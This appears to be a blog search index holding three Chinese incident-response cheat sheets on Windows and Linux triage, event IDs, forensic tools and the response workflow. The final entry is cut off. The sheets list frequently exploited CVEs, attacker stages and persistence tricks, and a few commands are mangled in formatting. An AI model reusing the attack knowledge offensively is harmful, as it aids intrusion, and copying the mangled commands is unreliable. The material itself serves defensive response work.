<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常用Windows应急响应整理</title>
      <link href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/002945/"/>
      <url>/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/002945/</url>
      
        <content type="html"><![CDATA[<h1 id="windows相关"><a class="anchor" href="#windows相关">#</a> Windows 相关</h1><h2 id="常用程序"><a class="anchor" href="#常用程序">#</a> 常用程序</h2><blockquote><p>小心被病毒整蛊，记住下面命令：</p></blockquote><ul><li><p><code>regedit</code> ：注册表编辑器，用于管理 Windows 系统的注册表，可以查看、编辑和修改注册表中的配置信息。</p></li><li><p><code>Taskmgr</code> ：任务管理器，用于查看和管理系统中运行的进程、服务和性能监控等。</p></li><li><p><code>msconfig</code> ：系统配置实用程序，用于管理 Windows 启动时的启动项、服务和引导选项，可以进行系统启动项的配置和管理。</p></li><li><p><code>eventvwr.msc</code> ：事件查看器，用于查看和分析系统和应用程序生成的事件日志，帮助诊断和解决系统问题。</p></li><li><p><code>compmgmt.msc</code> ：计算机管理控制台，提供了对计算机硬件、设备管理、本地用户和组管理、磁盘管理等的集中管理。</p></li><li><p><code>gpedit.msc</code> ：组策略编辑器，用于管理 Windows 系统中的组策略，可以配置计算机和用户的策略设置。</p></li><li><p><code>taskschd.msc</code> ：任务计划程序，用于创建和管理定时任务，可以设置计划运行的程序、脚本和操作等。</p></li><li><p><code>lusrmgr.msc</code> ：本地用户和组管理器，用于管理本地计算机上的用户账户和用户组，可以创建、修改和删除用户账户和组。</p></li></ul><h2 id="特别注意"><a class="anchor" href="#特别注意">#</a> 特别注意</h2><ol><li><p>获取本机用户列表<br> <code>net user</code></p></li><li><p>管理员<br> <code>net localgroup administrators</code></p></li><li><p>当前会话<br> <code>net session</code></p></li><li><p>当前运行的服务<br> <code>net start</code></p></li><li><p>远程连接<br> <code>net use</code></p></li><li><p>当前用户共享目录<br> <code>net share</code></p></li><li><p>最近打开文件</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%UserProfile%\Recent</span><br><span class="line">%APPDATA%\Microsoft\Windows\Recent</span><br></pre></td></tr></tbody></table></figure><ol start="8"><li>查找文件中的字符串<br> <code>findstr /m /i /s "hello" *.txt</code></li></ol><h2 id="常用命令"><a class="anchor" href="#常用命令">#</a> 常用命令</h2><blockquote><p>这些命令可用于网络连接和进程管理，获取系统信息和补丁，以及计算文件的哈希值。你可以根据需要使用它们来进行系统管理、安全检查和文件验证。</p></blockquote><h3 id="网络相关命令"><a class="anchor" href="#网络相关命令">#</a> 网络相关命令</h3><ul><li><code>netstat -ano</code> ：显示网络连接、监听端口和进程的详细信息，包括相关的进程 ID。</li></ul><h3 id="系统信息命令"><a class="anchor" href="#系统信息命令">#</a> 系统信息命令</h3><ul><li><code>systeminfo</code> ：显示系统的详细信息，包括操作系统版本、补丁信息、硬件配置等。特别关注补丁信息，以确保系统的安全性。</li></ul><h3 id="进程管理命令"><a class="anchor" href="#进程管理命令">#</a> 进程管理命令</h3><ul><li><p><code>Wmic process</code> ：用于查询和管理系统中的进程。</p><ul><li><p><code>Wmic process where name="cmd.exe" get processid,executablepath,name</code> ：查询并显示名称为 "cmd.exe" 的进程的进程 ID、可执行路径和名称。</p></li><li><p><code>Wmic process where processid="***" get executablepath,name</code> ：查询并显示指定进程 ID 的进程的可执行路径和名称。</p></li></ul></li><li><p><code>tasklist /m ***.dll</code> ：显示指定 DLL 文件相关的进程列表。</p></li></ul><h3 id="文件哈希计算命令"><a class="anchor" href="#文件哈希计算命令">#</a> 文件哈希计算命令</h3><ul><li><code>certutil -hashfile %样本exe% MD5</code> ：计算指定样本文件（例如样本 exe）的 MD5 哈希值。</li></ul><h2 id="敏感目录"><a class="anchor" href="#敏感目录">#</a> 敏感目录</h2><blockquote><p>这些敏感目录通常包含重要的系统文件、用户数据和应用程序配置文件。黑客或恶意软件可能会利用这些目录来隐藏恶意文件、执行攻击或获取敏感信息。因此，在网络安全中，对这些目录进行适当的保护和监控非常重要。</p></blockquote><ul><li><p><code>%WINDIR%</code> ：Windows 系统目录，通常为  <code>C:\Windows</code> 。该目录包含了操作系统的核心文件和系统配置文件。</p></li><li><p><code>%WINDIR%\system32\</code> ：Windows 系统目录下的  <code>system32</code>  子目录，通常为  <code>C:\Windows\system32</code> 。该目录包含了许多系统和应用程序的关键文件和库文件。</p></li><li><p><code>%TEMP%</code> ：当前用户的临时文件夹路径。通常为  <code>C:\Users\用户名\AppData\Local\Temp</code> 。临时文件夹用于存储临时文件和缓存文件。</p></li><li><p><code>%LOCALAPPDATA%</code> ：当前用户的本地应用数据文件夹路径。通常为  <code>C:\Users\用户名\AppData\Local</code> 。该目录用于存储与用户相关的应用程序数据，如缓存文件、配置文件等。</p></li><li><p><code>%APPDATA%</code> ：当前用户的应用数据文件夹路径。通常为  <code>C:\Users\用户名\AppData\Roaming</code> 。该目录用于存储应用程序的个人设置、配置文件和其他用户特定的数据。</p></li></ul><h2 id="日志"><a class="anchor" href="#日志">#</a> 日志</h2><h3 id="事件查看器"><a class="anchor" href="#事件查看器">#</a> 事件查看器</h3><ul><li><code>eventvwr</code> ：事件查看器，用于查看和分析系统和应用程序生成的事件日志。</li></ul><h3 id="事件日志路径"><a class="anchor" href="#事件日志路径">#</a> 事件日志路径</h3><ul><li><p><code>%SystemRoot%System32WinevtLogsSystem.evtx</code> ：系统日志文件路径，包含有关系统启动、关闭和其他系统级事件的信息。</p></li><li><p><code>%SystemRoot%System32WinevtLogsSecurity.evtx</code> ：安全日志文件路径，包含有关安全相关事件的信息。</p></li></ul><h3 id="系统启动关闭事件"><a class="anchor" href="#系统启动关闭事件">#</a> 系统启动 / 关闭事件</h3><ul><li><code>系统启动/关闭 12/13</code> ：指示系统启动和关闭的事件计数。</li></ul><h3 id="事件日志服务启动关闭事件"><a class="anchor" href="#事件日志服务启动关闭事件">#</a> 事件日志服务启动 / 关闭事件</h3><ul><li><code>事件日志服务启动/关闭 6005/6006</code> ：指示事件日志服务的启动和关闭事件计数。</li></ul><h3 id="常见事件id表"><a class="anchor" href="#常见事件id表">#</a> 常见事件 ID 表：</h3><table><thead><tr><th style="text-align:center">事件 ID</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">1102</td><td style="text-align:center">清理审计日志</td></tr><tr><td style="text-align:center">4624</td><td style="text-align:center">账号成功登录</td></tr><tr><td style="text-align:center">4625</td><td style="text-align:center">账号登录失败</td></tr><tr><td style="text-align:center">4768</td><td style="text-align:center">Kerberos 身份验证 (TGT 请求)</td></tr><tr><td style="text-align:center">4769</td><td style="text-align:center">Kerberos 服务票证请求</td></tr><tr><td style="text-align:center">4776</td><td style="text-align:center">NTLM 身份验证</td></tr><tr><td style="text-align:center">4672</td><td style="text-align:center">授予特殊权限</td></tr><tr><td style="text-align:center">4720</td><td style="text-align:center">创建用户</td></tr><tr><td style="text-align:center">4726</td><td style="text-align:center">删除用户</td></tr><tr><td style="text-align:center">4728</td><td style="text-align:center">将成员添加到启用安全的全局组中</td></tr><tr><td style="text-align:center">4729</td><td style="text-align:center">将成员从安全的全局组中移除</td></tr><tr><td style="text-align:center">4732</td><td style="text-align:center">将成员添加到启用安全的本地组中</td></tr><tr><td style="text-align:center">4733</td><td style="text-align:center">将成员从启用安全的本地组中移除</td></tr><tr><td style="text-align:center">4756</td><td style="text-align:center">将成员添加到启用安全的通用组中</td></tr><tr><td style="text-align:center">4757</td><td style="text-align:center">将成员从启用安全的通用组中移除</td></tr><tr><td style="text-align:center">4719</td><td style="text-align:center">系统审计策略修改</td></tr></tbody></table><h3 id="常见-logontype-值"><a class="anchor" href="#常见-logontype-值">#</a> 常见 LogonType 值</h3><table><thead><tr><th style="text-align:center">LogonType 值</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">2</td><td style="text-align:center">交互式登录</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">网络登录（一般情况下就是永恒之蓝）</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">批处理登录</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">服务登录</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">解锁</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">网络远程登录</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">缓存的远程登录</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center">远程交互式登录</td></tr><tr><td style="text-align:center">...</td><td style="text-align:center">...</td></tr></tbody></table><h2 id="应急工具"><a class="anchor" href="#应急工具">#</a> 应急工具</h2><p>下面是一些应急工具的示例和相关信息：</p><ul><li><p><strong>PChunter</strong>：Antirootkit 工具，用于检测和清除系统中的 rootkit（恶意软件）。</p></li><li><p><strong>Autoruns</strong>：启动项管理工具，用于查看和管理系统启动时自动运行的程序、服务和驱动程序。</p></li><li><p><strong>ProcessExplorer</strong>：进程查看工具，提供了比任务管理器更详细和全面的进程信息，包括进程的资源使用、文件关联等。</p></li><li><p><strong>ProcessMonitor</strong>：进程监控工具，用于实时监视和记录系统上的进程活动、文件系统活动和注册表活动。</p></li><li><p><strong>TCPView</strong>：网络连接查看工具，显示当前系统上的网络连接和相关的进程信息，可用于监视和分析网络连接。</p></li><li><p><strong>Microsoft Network Monitor</strong>：网络监控工具，可用于捕获和分析网络数据包，提供详细的网络通信信息和相关的进程。</p></li><li><p><strong>D 盾</strong>：Webshell 查杀工具，用于检测和清除 Web 服务器上的恶意 Webshell（恶意脚本）。</p></li><li><p><strong>Everything</strong>：快速搜索工具，可以快速索引和搜索系统上的文件和文件夹。</p></li><li><p><strong>BeaconEye</strong>：针对 Cobalt Strike（一种渗透测试工具）的特征检测工具。可在 GitHub 上找到该工具，地址为: <a href="https://github.com/CCob/BeaconEye">CCob/BeaconEye</a>。</p></li></ul><h2 id="威胁情报样本分析平台"><a class="anchor" href="#威胁情报样本分析平台">#</a> 威胁情报 / 样本分析平台：</h2><p>奇安信威胁情报中心<br>微步在线社区<br> Virus total<br>IBMXFORCE</p><h2 id="sysmonsystem-monitor在事件查看器中查看"><a class="anchor" href="#sysmonsystem-monitor在事件查看器中查看">#</a> Sysmon（System Monitor）（在事件查看器中查看）</h2><p>Sysmon 可以监控并记录操作系统内核级别的事件，包括进程创建、文件创建、网络连接、注册表操作、服务启动、驱动加载等等。这些事件的详细信息被记录在 Windows 事件日志中，可以通过事件查看器或其他日志分析工具进行检索和分析。</p><table><thead><tr><th>事件 ID</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>进程创建</td></tr><tr><td>3</td><td>网络连接</td></tr><tr><td>11</td><td>文件创建</td></tr><tr><td>22</td><td>记录 DNS 查询</td></tr></tbody></table><h2 id="内存取证"><a class="anchor" href="#内存取证">#</a> 内存取证</h2><p>Dumplt / FTK imager / WinPMem</p><h3 id="分析"><a class="anchor" href="#分析">#</a> 分析</h3><p>Volatility (github: volatilityfoundation/volatility)<br> volatility -f [内存文件] --profile=[配置文件] &lt; 插件 &gt; # 不同版本有不同的配置文件</p><h1 id="案例"><a class="anchor" href="#案例">#</a> 案例</h1>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> hvv </tag>
            
            <tag> tools </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应以及常用Windows命令工具分享</title>
      <link href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/231746/"/>
      <url>/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/231746/</url>
      
        <content type="html"><![CDATA[<h1 id="应急响应"><a class="anchor" href="#应急响应">#</a> 应急响应</h1><h2 id="应急响应目的"><a class="anchor" href="#应急响应目的">#</a> 应急响应目的</h2><blockquote><p>哈哈，先拔网线，别关机，会损害现场。。</p></blockquote><ol><li>判断这次应急是否是被成功入侵的安全事件</li><li>阻断黑客攻击</li><li>找出攻击者的第一入口点，提取恶意样本</li><li>帮助客户梳理攻击者的攻击路线，提供漏洞修复方案</li></ol><h2 id="应急响应流程"><a class="anchor" href="#应急响应流程">#</a> 应急响应流程</h2><ul><li><strong>事件判断:</strong> 判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS 等等.</li><li><strong>临时处置:</strong> 给出客户临时处置建议，断网隔离，保护现场环境。</li><li><strong>信息收集分析:</strong> 收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析、样本分析</li><li><strong>清理处置:</strong> 直接杀掉进程，删除文件，打补丁，抑或是修复文件。</li><li><strong>产出报告:</strong> 整理并输出完整的安全事件报告。</li></ul><h2 id="应急前沟通"><a class="anchor" href="#应急前沟通">#</a> 应急前沟通</h2><ol><li>现场现象是什么？如何发现的？</li><li>依据是什么？</li><li>什么时候发现的？</li><li>目前是否有做物理隔离 (断网)?</li><li>受害机器是哪个？</li><li>受害服务有几台？(1 台 / N 台)</li><li>最先发现是哪台？</li><li>这台服务器对外有哪些服务？</li><li>这台服务器与其他机器是否处于同一个内网？</li><li>操作系统类型？是否有公网映射业务？远程管理方式？</li><li>网络边界有没有流量监控设备？</li><li>主机侧是否有 EDR 等安全设备？</li></ol><h2 id="应急响应杂谈"><a class="anchor" href="#应急响应杂谈">#</a> 应急响应杂谈</h2><ul><li>要点一：<strong>了解常见端口的攻击手法</strong></li><li>要点二：<strong>不要相信客户说的话</strong></li></ul><h2 id="攻击者常利用的web漏洞"><a class="anchor" href="#攻击者常利用的web漏洞">#</a> 攻击者常利用的 web 漏洞</h2><table><thead><tr><th style="text-align:center">攻击平台</th><th style="text-align:center">编号</th></tr></thead><tbody><tr><td style="text-align:center">Weblogic</td><td style="text-align:center">CVE-2017-3248, CVE-2017-10271, CVE-2018-2628, CVE-2018-2894</td></tr><tr><td style="text-align:center">Drupal</td><td style="text-align:center">CVE-2018-7600, CVE-2018-7602</td></tr><tr><td style="text-align:center">Struts2</td><td style="text-align:center">CVE-2017-5638, CVE-2017-9805, CVE-2018-11776</td></tr><tr><td style="text-align:center">ThinkPHP</td><td style="text-align:center">ThinkPHPv5 GetShell</td></tr><tr><td style="text-align:center">Windows Server</td><td style="text-align:center">弱口令爆破，CVE-2017-0143</td></tr><tr><td style="text-align:center">PHPStudy</td><td style="text-align:center">弱口令爆破</td></tr><tr><td style="text-align:center">PHPMyAdmin</td><td style="text-align:center">弱口令爆破</td></tr><tr><td style="text-align:center">MySQL</td><td style="text-align:center">弱口令爆破</td></tr><tr><td style="text-align:center">Spring Data Commons</td><td style="text-align:center">CVE-2018-1273</td></tr><tr><td style="text-align:center">Tomcat</td><td style="text-align:center">弱口令爆破，CVE-2017-12615</td></tr><tr><td style="text-align:center">MsSQL</td><td style="text-align:center">弱口令爆破</td></tr><tr><td style="text-align:center">Jekins</td><td style="text-align:center">CVE-2019-1003000</td></tr><tr><td style="text-align:center">JBoss</td><td style="text-align:center">CVE-2010-0738, CVE-2017-12149</td></tr></tbody></table><h2 id="攻击者常利用的组件漏洞"><a class="anchor" href="#攻击者常利用的组件漏洞">#</a> 攻击者常利用的组件漏洞</h2><table><thead><tr><th style="text-align:center">应用</th><th style="text-align:center">漏洞名</th></tr></thead><tbody><tr><td style="text-align:center">Docker</td><td style="text-align:center">Docker 未授权漏洞</td></tr><tr><td style="text-align:center">Nexus Repository</td><td style="text-align:center">Nexus Repository Manager 3 远程代码执行漏洞</td></tr><tr><td style="text-align:center">ElasticSearch</td><td style="text-align:center">ElasticSearch 未授权漏洞</td></tr><tr><td style="text-align:center">Hadoop Yarn</td><td style="text-align:center">Hadoop Yarn RESTAPI 未授权漏洞</td></tr><tr><td style="text-align:center">Kubernetes</td><td style="text-align:center">Kubernetes Api Server 未授权漏洞</td></tr><tr><td style="text-align:center">Jenkins</td><td style="text-align:center">Jenkins RCE (CVE-2019-1003000)</td></tr><tr><td style="text-align:center">Spark</td><td style="text-align:center">Spark RESTAPI 未授权漏洞</td></tr></tbody></table><h2 id="应急响应处置思路"><a class="anchor" href="#应急响应处置思路">#</a> 应急响应处置思路</h2><blockquote><p>应急响应反着来</p></blockquote><ul><li><strong>据实分析</strong></li><li><strong>合理猜测</strong></li><li><strong>积极沟通</strong></li></ul><h3 id="1-外网扫描梳理整个攻击过程"><a class="anchor" href="#1-外网扫描梳理整个攻击过程">#</a> 1. 外网扫描（梳理整个攻击过程）</h3><ul><li>利用漏洞扫描器进行</li><li>web 扫描</li><li>Xray</li><li>AWVS</li><li>SQLMAP</li><li>...</li></ul><h3 id="2-漏洞利用回溯攻击者操作"><a class="anchor" href="#2-漏洞利用回溯攻击者操作">#</a> 2. 漏洞利用（回溯攻击者操作）</h3><p>通过一些高位的漏洞<br> Shiro/struts2 等反序列命令执行..</p><h3 id="3-主机控制确定攻击者ip"><a class="anchor" href="#3-主机控制确定攻击者ip">#</a> 3. 主机控制（确定攻击者 IP）</h3><ul><li>上传 webshell，反弹 shell，利用远程控制程序进行控制</li><li>CS（CobaltStrike）</li><li>Metasploit</li></ul><h3 id="4-横向渗透找到webshell"><a class="anchor" href="#4-横向渗透找到webshell">#</a> 4. 横向渗透（找到 webshell）</h3><ul><li>上传内网渗透工具，扫描内网，跳板攻击</li><li>CS（CobaltStrike）</li><li>Metasploit</li></ul><h2 id="实战攻击场景下应急响应"><a class="anchor" href="#实战攻击场景下应急响应">#</a> 实战攻击场景下应急响应</h2><h3 id="web攻击事件"><a class="anchor" href="#web攻击事件">#</a> web 攻击事件</h3><ul><li><strong>相关表现:</strong> 页面被篡改、恶意推广、黑词黑页、webshell</li><li><strong>相关危害:</strong> 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容、拖库、内网沦陷等</li><li><strong>排查要点:</strong> 能否多个环境下复现异常现象，确定相关资产是否存在，恶意文件是否确实存在于服务器上</li><li><strong>操作要点:</strong> 备份文件，webshell 后门查杀；web 日志分析；web 中间件缓存处理；web 中间件配置检查；重启 web 中间件；服务器后门检查；</li><li><strong>防护措施:</strong> 加固相关 web 应用，修改相关系统的所有用户密码</li></ul><h3 id="链路劫持"><a class="anchor" href="#链路劫持">#</a> 链路劫持</h3><ul><li><strong>相关表现:</strong> 区域性服务不可用或返回异常内容</li><li><strong>相关危害:</strong> 导致搜索引擎告警、微信等 app 分享告警、首页敏感内容等</li><li><strong>排查要点:</strong> 能否多个环境下复现异常现象，确定相关资产是否存在，恶意文件是否确实存在于服务器上</li><li><strong>操作要点:</strong> 跨地区、运营商进行测试，确定受影响范围，在能复现的环境中判断是 DNS 劫持还是 HTTP 劫持 S</li><li><strong>防护措施:</strong> 重要业务部署 https</li></ul><h3 id="替换命令"><a class="anchor" href="#替换命令">#</a> 替换命令</h3><blockquote><p>替换 ssh 或 rpm 包</p></blockquote><ul><li><strong>相关表现:</strong> 无明显表现</li><li><strong>相关危害:</strong> 将后门、木马持久化在系统中；窃取账号、密码等重要凭证</li><li><strong>排查要点:</strong> 使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面</li><li><strong>操作要点:</strong> 使用静态链接的 busybox; 重新安装被替换的包</li><li><strong>验证命令:</strong><ul><li><code>rpm 一Va</code></li><li><code>dpkg --verify</code></li></ul></li></ul><h3 id="劫持动态链接库"><a class="anchor" href="#劫持动态链接库">#</a> 劫持动态链接库</h3><blockquote><p>ld,so,preload</p></blockquote><ul><li><strong>相关表现:</strong> 无明显表现</li><li><strong>相关危害:</strong> 将后门、木马持久化在系统中；窃取账号、密码等重要凭证</li><li><strong>排查要点:</strong> 检查 <code>/etc/ld.so.preload</code> ， <code>ld.so</code>  (如 <code>/lib/x86_64-linux-gnu/ld-2.27.so</code> )</li><li><strong>操作要点:</strong> 使用静态链接的 busybox; 重启被注入恶意模块的进程，必要时直接重启系统</li></ul><h3 id="rootkit"><a class="anchor" href="#rootkit">#</a> rootkit</h3><ul><li><strong>相关表现:</strong> 无明显表现</li><li><strong>相关危害:</strong> 将后门、木马持久化在系统中；隐藏文件、进程等信息</li><li><strong>排查要点:</strong> 确定是否存在无法使用常规命令查看的文件、进程；</li><li><strong>操作要点:</strong> 使用 tyton 内核态 rootkit 检测工具检测；检查 <code>/etc/modules</code>  是否有未知的内核模块</li></ul><h3 id="计划任务"><a class="anchor" href="#计划任务">#</a> 计划任务</h3><ul><li><strong>相关表现:</strong> 特定时间间隔触发木马、后门、网络链接、DNS 请求、篡改页面等行为</li><li><strong>相关危害:</strong> 将后门、木马持久化在系统中，周期性篡改页面、拉取数据等</li><li><strong>操作要点:</strong> 停止计划任务服务后再操作，注意辨别利用 \r 回车符的障眼法小技巧</li><li><strong>排查要点:</strong> 判断是否存在周期性出现的异常现象，检查 <code>/var/spool/cron/crontabs/</code> ， <code>/etc/cron.*</code>  等常用计划任务配置文件</li></ul><h3 id="远控木马"><a class="anchor" href="#远控木马">#</a> 远控木马</h3><ul><li><strong>相关表现:</strong> 有持续或间断性的对外网络链接或 DNS 请求等通信行为</li><li><strong>相关危害:</strong> 窃取系统资料、作为跳板进一步攻击内网其他机器</li><li><strong>排查要点:</strong> 关注 tcp、udp、icmp 等一切网络行为，检查注册表、服务、开机目录、计划任务等一系列常见的持久化点</li><li><strong>操作要点:</strong> 检查网络连接，以及 IDS 设备上的异常远控告警</li></ul>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> hvv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用linux应急响应命令整理</title>
      <link href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/215254/"/>
      <url>/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/215254/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a class="anchor" href="#常用命令">#</a> 常用命令</h2><h3 id="ps-auxf"><a class="anchor" href="#ps-auxf">#</a> ps -auxf</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -auxf</span><br></pre></td></tr></tbody></table></figure><p>此命令用于显示系统中当前运行的进程。 <code>-a</code>  选项显示所有用户的进程， <code>-u</code>  选项显示进程的详细信息， <code>-x</code>  选项显示没有控制终端的进程， <code>-f</code>  选项以全格式显示进程信息。</p><h3 id="netstat-antlp-more"><a class="anchor" href="#netstat-antlp-more">#</a> netstat -antlp | more</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | more</span><br></pre></td></tr></tbody></table></figure><p>此命令用于查看系统中的网络连接和监听端口。 <code>-a</code>  选项显示所有连接和监听端口， <code>-n</code>  选项以数字形式显示地址和端口， <code>-t</code>  选项只显示 TCP 连接， <code>-l</code>  选项只显示监听端口， <code>-p</code>  选项显示与进程关联的端口， <code>| more</code>  用于分页显示输出结果。</p><h3 id="ls-alt-procpid号"><a class="anchor" href="#ls-alt-procpid号">#</a> ls -alt /proc/pid 号</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /proc/pid号</span><br></pre></td></tr></tbody></table></figure><p>此命令用于查看指定进程的详细信息。 <code>ls</code>  命令用于列出文件和目录， <code>-a</code>  选项显示所有文件和目录（包括隐藏文件）， <code>-l</code>  选项以长格式显示详细信息， <code>-t</code>  选项按修改时间排序， <code>/proc</code>  是一个特殊目录，包含系统中运行的进程的信息， <code>pid号</code> 是要查看的进程的进程 ID。</p><h3 id="ls-alh-procpid"><a class="anchor" href="#ls-alh-procpid">#</a> ls -alh /proc/pid</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /proc/pid</span><br></pre></td></tr></tbody></table></figure><p>此命令用于查看指定进程的详细信息。 <code>-a</code>  选项显示所有文件和目录（包括隐藏文件）， <code>-l</code>  选项以长格式显示详细信息， <code>-h</code>  选项以人类可读的方式显示文件大小， <code>/proc</code>  是一个特殊目录，包含系统中运行的进程的信息， <code>pid</code>  是要查看的进程的进程 ID。</p><h3 id="lsof-i端口号-p-u"><a class="anchor" href="#lsof-i端口号-p-u">#</a> lsof -i: 端口号 /-p/-u</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:端口号 /-p /-u</span><br></pre></td></tr></tbody></table></figure><p>此命令用于查看指定端口的相关进程或指定用户打开的文件。 <code>lsof</code>  命令用于列出打开的文件， <code>-i:端口号</code> 选项显示指定端口相关的进程， <code>/-p</code>  选项显示指定进程打开的文件， <code>/-u</code>  选项显示指定用户打开的文件。</p><h3 id="挖矿病毒常利用手段"><a class="anchor" href="#挖矿病毒常利用手段">#</a> 挖矿病毒常利用手段</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chattr +i</span><br><span class="line">lsattr</span><br></pre></td></tr></tbody></table></figure><ul><li><p><code>chattr +i</code> ：此命令用于改变文件的属性。 <code>chattr</code>  命令用于改变文件的扩展属性， <code>+i</code>  选项设置文件为不可修改属性，防止文件被删除、重命名或修改。</p></li><li><p><code>lsattr</code> ：此命令用于显示文件的扩展属性。 <code>lsattr</code>  命令用于</p></li></ul><p>列出文件的扩展属性，包括文件的可修改性、不可修改性、是否加密等。</p><h3 id="需要注意的几个目录"><a class="anchor" href="#需要注意的几个目录">#</a> 需要注意的几个目录</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/etc/rc.local</span><br><span class="line">/root/.ssh</span><br><span class="line">/tmp</span><br><span class="line">/etc/init.d</span><br><span class="line">/etc/hosts</span><br></pre></td></tr></tbody></table></figure><p>此路径对应着系统启动时执行的脚本文件。 <code>/etc/rc.local</code>  文件包含在系统启动过程中自动执行的命令，可以用于配置系统启动时需要运行的自定义脚本。</p><h3 id="ls-alt-etcprofiledsh"><a class="anchor" href="#ls-alt-etcprofiledsh">#</a> ls -alt /etc/profile.d/*.sh</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /etc/profile.d/*.sh</span><br></pre></td></tr></tbody></table></figure><p>此命令用于列出 <code>/etc/profile.d/</code>  目录下以 <code>.sh</code>  为后缀的脚本文件，并按照修改时间排序显示详细信息。 <code>ls</code>  命令用于列出文件和目录， <code>-a</code>  选项显示所有文件和目录（包括隐藏文件）， <code>-l</code>  选项以长格式显示详细信息， <code>-t</code>  选项按修改时间排序， <code>/etc/profile.d/*.sh</code>  表示匹配 <code>/etc/profile.d/</code>  目录下以 <code>.sh</code>  为后缀的所有文件。</p><h3 id="cat-etcpasswd-cut-f-1-d-xargs-l-crontab-l-u"><a class="anchor" href="#cat-etcpasswd-cut-f-1-d-xargs-l-crontab-l-u">#</a> cat /etc/passwd | cut -f 1 -d : | xargs -l {} crontab -l -u {}</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | cut -f 1 -d : | xargs -l {} crontab -l -u {}</span><br></pre></td></tr></tbody></table></figure><p>此命令用于查看系统中所有用户的定时任务。 <code>cat</code>  命令用于显示文件内容， <code>/etc/passwd</code>  是一个包含系统用户信息的文件， <code>cut</code>  命令用于提取指定字段， <code>-f 1</code>  选项指定提取第一个字段（用户名）， <code>-d :</code>  选项指定字段的分隔符为冒号， <code>xargs</code>  命令用于将前面的输出作为参数传递给后面的命令， <code>-l</code>  选项表示逐行处理， <code>{}</code>  表示参数的占位符， <code>crontab -l -u {}</code>  用于查看指定用户的定时任务列表。</p><h2 id="软件包校验"><a class="anchor" href="#软件包校验">#</a> 软件包校验</h2><ul><li><p><code>rpm -Va</code> ：校验 RPM 软件包的完整性和一致性。如果输出中出现以下标记，表示不一致：s (size)、m (modify)、5 (MD5)、d (device)、l (link)、u (user)、g (group)、t (time)。特别需要注意的是 SM5 标记。</p></li><li><p><code>dpkg -verify</code> ：校验 Debian 软件包的完整性和一致性。</p></li></ul><h2 id="文件操作"><a class="anchor" href="#文件操作">#</a> 文件操作</h2><ul><li><p><code>stat</code> ：显示文件或文件系统的详细信息。</p></li><li><p><code>find / -mtime 0 -name *.*</code> ：查找指定天数内更改过的文件。</p></li><li><p><code>find / -ctime 0 -name *.*</code> ：查找新增的文件。</p></li><li><p><code>diff -c</code> ：比较文件的差异并生成上下文格式的差异。</p></li></ul><h2 id="查找隐藏进程"><a class="anchor" href="#查找隐藏进程">#</a> 查找隐藏进程</h2><ul><li><pre><code>ps -ef | awk '{print $2}' | sort -n | uniq &gt; ps.pls /proc | sort -n | uniq &gt; proc.p</code></pre><p>查找隐藏进程的命令。</p></li></ul><h2 id="ssh-爆破"><a class="anchor" href="#ssh-爆破">#</a> SSH 爆破</h2><ul><li><code>last/lastb/lastlog</code> ：查看登录记录。</li></ul><h2 id="日志"><a class="anchor" href="#日志">#</a> 日志</h2><ul><li><p><code>/var/log/secure</code> ：安全日志文件。</p><ul><li><p><code>awk '/sshd.*Failed/{print $(NF -3)}' /var/log/secure | sort | uniq -c | sort -nr</code> ：查找每个 IP 登录失败的次数。</p></li><li><p>每条记录的格式：时间 - 主机名 - 服务名称 - 